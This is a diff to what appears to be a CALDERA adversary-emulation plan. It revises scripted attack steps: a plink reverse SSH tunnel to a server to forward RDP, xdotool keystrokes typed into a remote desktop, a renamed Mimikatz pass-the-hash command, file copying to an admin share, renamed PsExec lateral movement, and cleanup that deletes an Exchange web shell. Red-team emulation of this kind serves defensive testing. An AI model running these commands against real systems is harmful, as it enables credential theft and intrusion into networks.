@@ -563,7 +563,7 @@
     windows:
       proc:
         command: |
-          exec-background C:\Users\Public\Downloads\plink.exe -no-antispoof -ssh -N -R #{caldera.server.ip}:13389:#{second.target.ip}:3389 -l #{caldera.user.name} -pw "#{caldera.user.password}" #{caldera.server.ip}
+          exec-background C:\Windows\System32\cmd.exe /c echo yes | C:\Users\Public\Downloads\plink.exe -no-antispoof -ssh -N -R #{caldera.server.ip}:13389:#{second.target.ip}:3389 -l #{caldera.user.name} -pw "#{caldera.user.password}" #{caldera.server.ip}
         timeout: 120
   input_arguments:
     caldera.server.ip:
@@ -593,7 +593,7 @@
     linux:
       proc:
         command: |
-          exec-background xfreerdp /u:'#{network.domain.name}\#{initial.target.user}' /p:'#{initial.target.password}' /v:localhost:13389 /cert-ignore
+          exec-background xfreerdp /u:'#{network.domain.name}\#{initial.target.user}' /p:'#{initial.target.password}' /v:localhost:13389 /cert:ignore
 
 
 # Step 8
@@ -667,23 +667,39 @@
         command: |
           sleep 5;
           rdp_pid=$(pgrep -f "xfreerdp.*/v:localhost");
-          rdp_window=$(xdotool search --pid "$rdp_pid");
-          xdotool key --window "$rdp_window" Super_L;
-          sleep 5; 
-          xdotool windowactivate --sync "$rdp_window" type --delay 200 "cmd";
-          sleep 3; 
-          xdotool key --window "$rdp_window" Ctrl+Shift+Return;
-          sleep 3; 
-          xdotool key --window "$rdp_window" Tab Tab;
+          rdp_window=$(xdotool search --pid "$rdp_pid" | head -n 1);
+          sleep 5;
+          rdp_pid=$(pgrep -f "xfreerdp.*/v:localhost");
+          rdp_window=$(xdotool search --pid "$rdp_pid" –onlyvisible | head -n 1);
+          xdotool windowactivate --sync "$rdp_window";
+          eval $(xdotool getwindowgeometry --shell "$rdp_window");
+          xdotool mousemove $((X + WIDTH / 2)) $((Y + HEIGHT / 2)) click 1;
+          sleep 1;
+          xdotool key –clearmodifiers --window "$rdp_window" Ctrl+Shift+Escape; 
+          sleep 1;
+          xdotool key –clearmodifiers --window "$rdp_window" Shift+Tab+space; 
+          sleep 1;
+          xdotool key --window "$rdp_window" Alt;
+          sleep 1;
           xdotool key --window "$rdp_window" Return;
-          sleep 3; 
+          sleep 1;
+          xdotool key --window "$rdp_window" Return;
+          sleep 1;
+          xdotool type --window "$rdp_window" 'cmd.exe';
+          sleep 5; 
+          xdotool key --window "$rdp_window" Return;
+          sleep 5;
+          xdotool key --clearmodifiers --window "$rdp_window" Ctrl+Shift+Escape;
+          sleep 1;
+          xdotool key –clearmodifiers --window "$rdp_window" Alt+F4;
+          sleep 5;
           xdotool type --window "$rdp_window" 'C:\Windows\System32\mom64.exe "privilege::debug" "sekurlsa::pth /user:#{second.target.user} /domain:#{network.domain.name} /ntlm:#{second.target.ntlm}"';
           xdotool key --window "$rdp_window" Return;
           sleep 3; 
           xdotool type --window "$rdp_window" 'copy C:\Windows\Temp\Nt.dat \\#{third.target.ip}\C$\ProgramData\';
           xdotool key --window "$rdp_window" Return;
           sleep 3; 
-          xdotool type --window "$rdp_window" 'C:\Windows\System32\ps.exe \\#{third.target.ip} cmd.exe';
+          xdotool type --window "$rdp_window" 'C:\Windows\System32\ps.exe  /accepteula \\#{third.target.ip} cmd.exe';
           xdotool key --window "$rdp_window" Return;
           sleep 5;
         timeout: 150
@@ -812,6 +828,12 @@
           xdotool key --window "$rdp_window" Return;
           sleep 2;
           xdotool type --window "$rdp_window" 'del C:\Windows\System32\mom64.exe C:\Windows\temp\Nt.dat C:\Windows\System32\ps.exe';
+          xdotool key --window "$rdp_window" Return;
+          sleep 2;   
+          xdotool type --window "$rdp_window" 'attrib -h "C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\contact.aspx"';
+          xdotool key --window "$rdp_window" Return;
+          sleep 2;   
+          xdotool type --window "$rdp_window" 'del "C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\contact.aspx"';
           xdotool key --window "$rdp_window" Return;
           sleep 2;   
           xdotool type --window "$rdp_window" 'exit';
